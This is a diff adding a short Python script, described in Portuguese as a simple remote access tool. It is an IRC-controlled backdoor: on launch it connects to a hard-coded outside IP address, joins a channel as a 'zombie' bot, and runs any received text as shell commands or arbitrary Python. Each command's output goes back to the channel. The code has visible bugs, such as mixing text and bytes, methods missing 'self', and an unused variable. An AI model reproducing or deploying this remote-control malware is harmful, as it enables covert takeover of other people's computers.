@@ -1,0 +1,36 @@
+# GitHub -> @Cyber-Punk-cp2021
+# Ferramenta de acesso remoto simples.
+# Conhecimento nao e crime, compartilhe!
+
+import socket
+from time import strftime as time
+from subprocess import check_output as executar
+def exploit(data):
+  exec(data)
+class sistema():
+    def start(data):
+        if data[:4] == 'exec':
+            return executar(data[5:])
+        elif data[:7] == 'exploit':
+            try:
+                return exploit(data[8:])
+            except:
+                return '  [!] Opcao nao disponivel, contate o programador'
+class __irc__():
+    irc = socket.socket()
+    irc.connect(('154.35.175.228', 9090))
+    irc.send('USER Zumbi_Teste 0 * :teste:Zumbi_Teste\r\n'.encode())
+    irc.send('NICK Zumbi_Teste\r\n'.encode())
+    irc.send('JOIN #ratcarmodoparanaiba\r\n'.encode()) 
+    def enviar(msg):
+        try:
+            irc.send('PRIVMSG #ratcarmodoparanaiba :' + msg + '\r\n'.encode())
+        except:
+            irc.send('  [!]'.encode())
+    def receber():
+        while True:
+            data = irc.recv(1204).decode()
+            user = data.split(':')[1]
+            user = user.split('!')[0]
+            enviar(sistema.start(data))
+__irc__().receber()
